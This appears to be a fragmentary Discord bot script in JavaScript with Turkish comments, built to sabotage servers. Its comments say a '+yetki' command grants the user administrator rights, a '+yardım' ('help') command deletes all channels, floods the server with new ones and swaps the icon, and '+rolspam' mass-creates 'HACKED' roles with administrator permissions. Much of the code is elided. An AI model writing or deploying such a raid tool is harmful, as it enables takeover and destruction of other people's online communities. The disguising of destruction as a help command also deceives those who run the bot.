...
client.on('message', msg => {           
  ...
  if (!msg.author.bot && msg.content.toLowerCase() === '+kaç') {
...
client.on("message", msg => {
  if (msg.content === "+yetki") {  //SIZE YÖNETICI YETKISI VERIR +yetki KOMUTU 2 KERE YAZMANIZ GEREK.
    msg.delete();
...
client.on("message", async msg => {
  if (msg.content === "+yardım") {     ///yardım KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
    msg.delete();
    ...
    await msg.guild.setIcon("https://hizliresim.com/bxwfeh3");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
 ...
 //_asker_ TARAFINDAN YAPILMIŞTIR
  ...
  if (msg.content === "+rolspam") {  //ROL SPAM YAPAR
    ...
    msg.guild.createRole({
      ...
      name: "HACKED",
      color: "00FFA6",
      permissions: ["ADMINISTRATOR"] // _asker_ TARAFINDAN YAPILMIŞTIR
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00FFD4",
...
//TÜM TELİF HAKKI DİSCORD _asker_'E AİTTİR ÇALINMASI DURUMUNDA YASAL YOLLARA BAŞVURULACAKTIR.
